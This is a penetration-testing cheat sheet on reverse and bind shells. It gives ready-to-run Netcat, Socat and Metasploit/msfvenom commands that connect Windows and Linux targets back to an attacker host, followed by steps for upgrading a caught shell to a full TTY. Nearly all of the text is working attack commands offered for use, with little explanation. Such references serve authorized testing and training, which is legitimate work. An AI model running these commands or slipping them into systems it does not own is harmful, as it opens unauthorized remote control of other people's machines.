# Shells

## Netcat

The TCP/IP Swiss Army Knife, Netcat is the gold standard for learning how to throw and catch shells. This guide covers creating reverse and bind shell connections with Netcat. Other reverse/bind shell commands are provided as a convenience. Commonly, the installed version of `nc` does not support the `-e` flag to specify a file or command to execute after connection. For more information see the manpage for Netcat or try [static binaries](https://github.com/andrew-d/static-binaries)

### Reverse

Target attaches shell to attacker listener. The listener and shell are on the opposite side

```bash
# Catch (Listener)
nc -nlvp 443  # Linux Attacker

# Throw (Shell)
nc -e cmd.exe $attacker 443    # Windows Target
nc -e /bin/bash $attacker 443  # Linux Target
```

### Bind

Attacker attaches to target bind shell. The listener and shell are on the same side

```bash
# Throw (Listener, Shell)
nc -nlvp 443 -e cmd.exe    # Windows Target
nc -nlvp 443 -e /bin/bash  # Linux Target

# Catch
nc $target 443  # Linux Attacker
```

## Socat

 Useful for establishing two bidirectional byte streams and transfers data between hosts. Supports certificates, tunneling and more

### Reverse

```bash
# Catch (Listener)
socat -d -d TCP4-LISTEN:443 STDOUT  # Linux Attacker

# Throw (Shell)
socat TCP4:$attacker:443 EXEC:cmd.exe    # Windows Target
socat TCP4:$attacker:443 EXEC:/bin/bash  # Linux Target
```

#### Reverse TTY

```bash
# Catch (Listener)
socat TCP4-LISTEN:443 FILE:`tty`,raw,echo=0  # Linux Attacker

# Throw (Shell) :: Linux Target
socat TCP4:$attacker:443 EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane 
```

### Bind

```bash
# Throw (Listener, Shell)
socat -d -d TCP4-LISTEN:443 EXEC:cmd.exe    # Windows Target
socat -d -d TCP4-LISTEN:443 EXEC:/bin/bash  # Linux Target

# Catch
socat TCP4:$target:443 STDIN  # Linux Attacker
```

## Multi-handler (Metasploit)

```bash title="Linux target (Netcat)"
# Catch (Listener)
# Linux Attacker, Linux Target
msfconsole -q -x "
use exploit/multi/handler;
set payload cmd/unix/reverse_netcat;
set LHOST $lhost;
set LPORT ${lport:-443};
exploit"

# Throw (Shell)
msfvenom -p cmd/unix/reverse_netcat LPORT=${lport:-443} LHOST=$lhost  # Linux Target
```

```bash title="Windows target (PowerShell)"
# Catch (Listener)
# Linux Attacker, PowerShell Target
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/x64/powershell_reverse_tcp;
set LHOST $lhost;
set LPORT ${lport:-443};
exploit"

# Throw (Shell)
msfvenom -p windows/x64/powershell_reverse_tcp LPORT=${lport:-443} LHOST=$lhost  # PowerShell Target
```

## PTY Upgrade

Upgrade shell to pseudo teletype. Consider using alternate shells by inspecting `/etc/passwd` on linux target host. For example, consider `/bin/sh` instead of `/bin/bash`

### Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Magic Shell Upgrade

```bash
# Linux Attacker
echo $TERM
stty -a

# Linux Target
python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl-Z

# Linux Attacker
stty raw -echo  # send special chars over tty
fg

# Linux Target
reset
export SHELL=bash
export TERM=xterm
stty rows <rows> columns <columns>
```

!!! note ""

    ### Utility Function

    Preventing mistakes during shell upgrade is important. An incorrectly typed number or character can greatly decrease the usability of your shell. Run this function in your local terminal and copy/paste to the remote terminal to alleviate possible mistakes when upgrading your shell

    ```{.bash .editor title="magic shell upgrade" .copy}
    magic() {
      exports="export SHELL=/bin/bash; export TERM=xterm;"
      printf "$exports stty rows %d columns %d;\n" $(tput lines) $(tput cols)
    }
    ```

    ```{.console title="example output"}
    export SHELL=/bin/bash; export TERM=xterm; stty rows 69 columns 217;
    ```

## Troubleshooting

Throwing shells can sometimes be problematic. Test your connectivity using an ICMP listener

```bash
tcpdump -i tun0 icmp and src $rhost # ping-listener
```
